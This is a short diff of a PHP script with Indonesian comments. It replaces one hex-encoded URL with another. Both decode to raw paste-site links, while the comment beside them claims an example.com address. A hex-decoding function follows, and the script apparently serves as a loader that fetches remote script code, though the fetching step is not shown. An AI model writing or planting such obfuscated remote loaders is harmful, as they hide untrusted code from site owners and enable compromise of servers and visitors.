@@ -1,6 +1,6 @@
 <?php
 // Ubah hex ini dengan URL tujuan yang di-encode ke hex
-$hexUrl = "68747470733A2F2F7061737465652E6465762F722F5243487041594451"; // https://example.com/script.php
+$hexUrl = "68747470733A2F2F7061737465652E6465762F722F7939305863307974"; // https://example.com/script.php
 
 // Fungsi untuk decode hex ke string
 function hex2str($hex) {
